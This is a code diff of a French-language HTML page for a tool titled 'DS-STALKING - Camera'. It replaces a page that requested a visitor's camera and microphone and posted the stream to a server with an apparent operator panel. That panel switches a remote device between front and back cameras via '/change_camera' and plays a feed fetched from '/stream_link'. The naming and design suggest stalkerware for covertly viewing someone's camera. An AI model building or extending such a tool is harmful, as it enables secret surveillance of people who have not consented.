@@ -3,75 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Access</title>
+    <title>DS-STALKING - Camera</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
 </head>
 <body>
-    <h1>Demande d'accès à la caméra et au micro</h1>
-    <p>Pour commencer à partager votre caméra, cliquez sur le bouton ci-dessous.</p>
-    <button onclick="startStream()">Démarrer le flux vidéo</button>
-    <button onclick="switchCamera()">Changer de caméra</button>
+    <h1>DS-STALKING - Camera</h1>
 
+    <button onclick="changeCamera('front')">Caméra avant</button>
+    <button onclick="changeCamera('back')">Caméra arrière</button>
+
+    <h2>Flux Vidéo</h2>
     <video id="video" width="640" height="480" controls autoplay></video>
 
     <script>
-        let currentStream;
-        let currentDeviceId = null;
-        let videoElement = document.getElementById('video');
-        let videoTrack;
+        const socket = io(); // Connexion à SocketIO
 
-        async function startStream() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "environment" },  // Utilise la caméra arrière par défaut
-                    audio: true
-                });
-
-                currentStream = stream;
-                videoElement.srcObject = stream;
-                videoTrack = stream.getVideoTracks()[0]; // Obtient le premier track vidéo
-
-                // Envoyer le flux au serveur
-                const response = await fetch('/start_stream', {
-                    method: 'POST',
-                    body: JSON.stringify({ stream }),
-                    headers: { 'Content-Type': 'application/json' }
-                });
-
-                const data = await response.json();
-                console.log(data);
-            } catch (err) {
-                console.error('Erreur lors de l\'accès à la caméra :', err);
-            }
+        // Fonction pour changer de caméra
+        function changeCamera(cameraType) {
+            fetch("/change_camera", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ camera: cameraType })
+            }).then(response => response.json())
+              .then(data => {
+                  console.log(data);
+              }).catch(error => console.error(error));
         }
 
-        async function switchCamera() {
-            // Arrête le flux vidéo actuel
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-            }
-
-            // Change de caméra (avant ou arrière)
-            if (currentDeviceId === null) {
-                // On commence avec la caméra arrière
-                currentDeviceId = await getDeviceId("environment");
-            } else {
-                // Alterne entre la caméra avant et arrière
-                const facingMode = currentDeviceId === "environment" ? "user" : "environment";
-                currentDeviceId = await getDeviceId(facingMode);
-            }
-
-            // Demande un nouveau flux vidéo avec la caméra choisie
-            startStream();
-        }
-
-        // Récupère l'ID du périphérique en fonction du mode de prise de vue
-        async function getDeviceId(facingMode) {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const videoDevices = devices.filter(device => device.kind === "videoinput");
-
-            const device = videoDevices.find(device => device.label.toLowerCase().includes(facingMode));
-            return device ? device.deviceId : null;
-        }
+        // Initialiser la vidéo à partir du lien généré
+        fetch("/stream_link", {
+            method: "POST"
+        })
+        .then(response => response.json())
+        .then(data => {
+            const video = document.getElementById('video');
+            video.src = data.stream_url;
+        }).catch(error => console.error(error));
     </script>
 </body>
 </html>
